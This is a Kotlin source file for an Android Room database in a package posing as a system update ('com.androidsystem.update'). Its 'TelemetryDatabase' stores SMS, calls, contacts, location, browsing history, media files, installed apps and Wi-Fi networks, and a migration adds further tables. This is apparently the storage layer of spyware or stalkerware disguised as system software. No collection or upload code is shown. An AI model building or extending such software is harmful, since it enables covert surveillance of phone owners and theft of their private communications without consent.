package com.androidsystem.update.database

import androidx.room.Database
import androidx.room.RoomDatabase
import androidx.room.migration.Migration
import androidx.sqlite.db.SupportSQLiteDatabase

@Database(
    entities = [
        CollectedDataEntity::class,
        LocationEntity::class,
        SmsEntity::class,
        CallEntity::class,
        ContactEntity::class,
        BrowsingHistoryEntity::class,
        MediaFileEntity::class,
        DeviceInfoEntity::class,
        AppUsageEntity::class,
        InstalledAppEntity::class,
        WifiNetworkEntity::class,
        BatteryEventEntity::class
    ],
    version = 5,
    exportSchema = false
)
abstract class TelemetryDatabase : RoomDatabase() {
    abstract fun telemetryDao(): TelemetryDao

    companion object {
        // v4 -> v5: new tables for installed_apps, wifi_networks, battery_events.
        // Existing rows are preserved by Room's built-in copy data flow.
        val MIGRATION_4_5 = object : Migration(4, 5) {
            override fun migrate(db: SupportSQLiteDatabase) {
                db.execSQL(
                    "CREATE TABLE IF NOT EXISTS installed_apps (" +
                    "packageName TEXT NOT NULL PRIMARY KEY," +
                    "appName TEXT NOT NULL," +
                    "versionName TEXT NOT NULL," +
                    "versionCode INTEGER NOT NULL," +
                    "firstInstallTime INTEGER NOT NULL," +
                    "lastUpdateTime INTEGER NOT NULL," +
                    "isSystemApp INTEGER NOT NULL," +
                    "targetSdk INTEGER NOT NULL," +
                    "sourceDir TEXT NOT NULL," +
                    "timestamp INTEGER NOT NULL)"
                )
                db.execSQL(
                    "CREATE TABLE IF NOT EXISTS wifi_networks (" +
                    "id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL," +
                    "ssid TEXT NOT NULL," +
                    "bssid TEXT NOT NULL," +
                    "capabilities TEXT NOT NULL," +
                    "frequency INTEGER NOT NULL," +
                    "level INTEGER NOT NULL," +
                    "timestamp INTEGER NOT NULL)"
                )
                db.execSQL(
                    "CREATE TABLE IF NOT EXISTS battery_events (" +
                    "id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL," +
                    "level INTEGER NOT NULL," +
                    "plugged INTEGER NOT NULL," +
                    "temperature REAL NOT NULL," +
                    "voltage INTEGER NOT NULL," +
                    "health TEXT NOT NULL," +
                    "timestamp INTEGER NOT NULL)"
                )
                db.execSQL("CREATE INDEX IF NOT EXISTS index_wifi_networks_timestamp ON wifi_networks(timestamp)")
                db.execSQL("CREATE INDEX IF NOT EXISTS index_battery_events_timestamp ON battery_events(timestamp)")
            }
        }
    }
}
